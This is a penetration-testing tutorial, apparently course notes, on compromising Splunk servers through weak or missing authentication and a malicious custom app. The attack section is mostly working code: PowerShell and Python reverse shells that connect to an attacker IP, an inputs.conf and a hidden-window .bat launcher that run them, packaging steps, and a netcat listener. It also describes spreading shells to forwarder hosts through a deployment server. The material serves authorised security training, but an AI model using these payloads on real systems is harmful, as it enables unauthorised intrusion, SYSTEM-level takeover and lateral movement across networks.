Splunk is a log analytics tool used to gather, analyze and visualize data. Though not originally intended to be a SIEM tool, Splunk is often used for security monitoring and business analytics. Splunk deployments are often used to house sensitive data and could provide a wealth of information for an attacker if compromised. Historically, Splunk has not suffered from many known vulnerabilities aside from an information disclosure vulnerability (CVE-2018-11409) and an authenticated remote code execution vulnerability in very old versions (CVE-2011-4642).

We will more often than not see Splunk during our assessments, especially in large corporate environments during internal penetration tests. We have seen it exposed externally, but this is rarer. Splunk does not suffer from many exploitable vulnerabilities and is quick to patch any issues. The biggest focus of Splunk during an assessment would be weak or null authentication because admin access to Splunk gives us the ability to deploy custom applications that can be used to quickly compromise a Splunk server and possibly other hosts in the network depending on the way Splunk is set up.


## Discovery/Footprinting

Splunk is prevalent in internal networks and often runs as root on Linux or SYSTEM on Windows systems. While uncommon, we may encounter Splunk externally facing at times. Let's imagine that we uncover a forgotten instance of Splunk in our Aquatone report that has since automatically converted to the free version, which does not require authentication. Since we have yet to gain a foothold in the internal network, let's focus our attention on Splunk and see if we can turn this access into RCE.

The Splunk web server runs by default on port 8000. On older versions of Splunk, the default credentials are `admin:changeme`, which are conveniently displayed on the login page.

The latest version of Splunk sets credentials during the installation process. If the default credentials do not work, it is worth checking for common weak passwords such as `admin`, `Welcome`, `Welcome1`, `Password123`, etc.

We can discover Splunk with a quick Nmap service scan. Here we can see that Nmap identified the `Splunkd httpd` service on port 8000 and port 8089, the Splunk management port for communication with the Splunk REST API.
```bash
sudo nmap -sV 10.129.201.50
```

## Enumeration

The Splunk Enterprise trial converts to a free version after 60 days, which doesn’t require authentication. It is not uncommon for system administrators to install a trial of Splunk to test it out, which is subsequently forgotten about. This will automatically convert to the free version that does not have any form of authentication, introducing a security hole in the environment. Some organizations may opt for the free version due to budget constraints, not fully understanding the implications of having no user/role management.

Once logged in to Splunk (or having accessed an instance of Splunk Free), we can browse data, run reports, create dashboards, install applications from the Splunkbase library, and install custom applications.

Splunk has multiple ways of running code, such as server-side Django applications, REST endpoints, scripted inputs, and alerting scripts. A common method of gaining remote code execution on a Splunk server is through the use of a scripted input. These are designed to help integrate Splunk with data sources such as APIs or file servers that require custom methods to access. Scripted inputs are intended to run these scripts, with STDOUT provided as input to Splunk.

As Splunk can be installed on Windows or Linux hosts, scripted inputs can be created to run Bash, PowerShell, or Batch scripts. Also, every Splunk installation comes with Python installed, so Python scripts can be run on any Splunk system. A quick way to gain RCE is by creating a scripted input that tells Splunk to run a Python reverse shell script. We'll cover this in the next section.

Aside from this built-in functionality, Splunk has suffered from various public vulnerabilities over the years, such as this [SSRF](https://www.exploit-db.com/exploits/40895) that could be used to gain unauthorized access to the Splunk REST API. At the time of writing, Splunk has [47](https://www.cvedetails.com/vulnerability-list/vendor_id-10963/Splunk.html) CVEs. If we perform a vulnerability scan against Splunk during a penetration test, we will often see many non-exploitable vulnerabilities returned. This is why it is important to understand how to abuse built-in functionality.

# Attacking Splunk

## Abusing Built-In Functionality

We can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us. The `bin` directory in this repo has examples for [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) and [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Let's walk through this step-by-step.

To achieve this, we first need to create a custom Splunk application using the following directory structure.
```
splunk_shell/
├── bin
└── default
```

The `bin` directory will contain any scripts that we intend to run (in this case, a PowerShell reverse shell), and the default directory will have our `inputs.conf` file. Our reverse shell will be a PowerShell one-liner.
```powershell
#A simple and small reverse shell. Options and help removed to save space. 
#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.15',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

The [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk which script to run and any other conditions. Here we set the app as enabled and tell Splunk to run the script every 10 seconds. The interval is always in seconds, and the input (script) will only run if this setting is present.
```
[script://./bin/rev.py]
disabled = 0  
interval = 10  
sourcetype = shell 

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```

We need the `.bat` file, which will run when the application is deployed and execute the PowerShell one-liner.
```
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

Once the files are created, we can create a tarball or `.spl` file.
```bash
tar -cvzf updater.tar.gz splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf
```

The next step is to choose `Install app from file` and upload the application.
![[2023-06-04 19_47_07-Hack The Box - Academy.png]]

Before uploading the malicious custom app, let's start a listener using Netcat or [socat](https://linux.die.net/man/1/socat).
``` bash
nc -nvlp 443
```

On the `Upload app` page, click on browse, choose the tarball we created earlier and click `Upload`.
![[Pasted image 20230604194800.png]]

As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to `Enabled`.

In this case, we got a shell back as `NT AUTHORTY\SYSTEM`. If this were a real-world assessment, we could proceed to enumerate the target for credentials in the registry, memory, or stored elsewhere on the file system to use for lateral movement within the network. If this was our initial foothold in the domain environment, we could use this access to begin enumerating the Active Directory domain.


If we were dealing with a Linux host, we would need to edit the `rev.py` Python script before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.
``` python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```

If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the `$SPLUNK_HOME/etc/deployment-apps` directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.
